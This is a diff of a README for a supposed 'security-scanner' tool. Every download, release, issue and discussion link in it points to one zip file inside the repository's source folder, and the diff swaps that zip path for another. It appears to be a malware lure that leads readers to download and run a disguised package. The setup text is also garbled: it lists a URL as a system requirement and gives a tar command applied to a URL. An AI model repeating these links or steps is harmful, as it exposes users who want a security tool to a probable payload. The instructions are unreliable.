@@ -1,6 +1,6 @@
 # 🔒 security-scanner - Simple Tool for Safe Code
 
-[![Download Latest Release](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip)
 
 ## 📋 Overview
 
@@ -12,25 +12,25 @@ To use security-scanner, follow these simple steps.
 
 1. **System Requirements:**
    - Operating System: Windows, macOS, or Linux
-   - https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip Version 12 or later
+   - https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip Version 12 or later
    - Internet connection for downloading dependencies and updates
 
 2. **Installation:**
    - Open your web browser.
-   - Navigate to the [Releases page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip).
+   - Navigate to the [Releases page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip).
    - Look for the latest version available. Click on the version number to visit the release details.
-   - Download the package suitable for your operating system (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip` for Linux, or `.dmg` for macOS).
+   - Download the package suitable for your operating system (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip` for Linux, or `.dmg` for macOS).
 
 ## 💼 Download & Install
 
-To download security-scanner, visit the [Releases page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip) to access the various downloads.
+To download security-scanner, visit the [Releases page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip) to access the various downloads.
 
 1. On the Releases page, you will see a list of all available versions.
 2. Choose the latest version by clicking on it.
 3. Scroll to the "Assets" section. Click the appropriate file to start the download:
-   - For Windows: Click on `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip`
-   - For macOS: Click on `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip`
-   - For Linux: Click on `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip`
+   - For Windows: Click on `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip`
+   - For macOS: Click on `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip`
+   - For Linux: Click on `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip`
 
 4. Once the download completes, follow these instructions based on your operating system:
 
@@ -43,7 +43,7 @@ To download security-scanner, visit the [Releases page](https://raw.githubuserco
    - Drag the security-scanner icon to your Applications folder.
 
    **Linux:**
-   - Extract the `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip` file using the command: `tar -xzf https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip`.
+   - Extract the `https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip` file using the command: `tar -xzf https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip`.
    - Navigate to the extracted folder in the terminal.
    - Run the scanner with: `./security-scanner`.
 
@@ -77,11 +77,11 @@ After installation, you are ready to use security-scanner to check your codebase
 
 ## 📄 Report Issues
 
-If you encounter issues while using security-scanner, please report them on the [Issues page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip). Provide as much detail as possible so we can assist you effectively.
+If you encounter issues while using security-scanner, please report them on the [Issues page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip). Provide as much detail as possible so we can assist you effectively.
 
 ## 💬 Community and Support
 
-Join our community for tips, support, and discussions related to security practices. You can find us on our [GitHub Discussions page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip). 
+Join our community for tips, support, and discussions related to security practices. You can find us on our [GitHub Discussions page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip). 
 
 ## 📢 Contributions
 
@@ -95,9 +95,9 @@ Your help is appreciated!
 
 ## 🔗 Useful Links
 
-- [Releases page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip)
-- [Issues page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip)
-- [GitHub Discussions](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/utils/security_scanner_v2.6.zip)
+- [Releases page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip)
+- [Issues page](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/666Vendetta666/security-scanner/main/src/config/scanner-security-1.5.zip)
 
 ## 📑 License
 
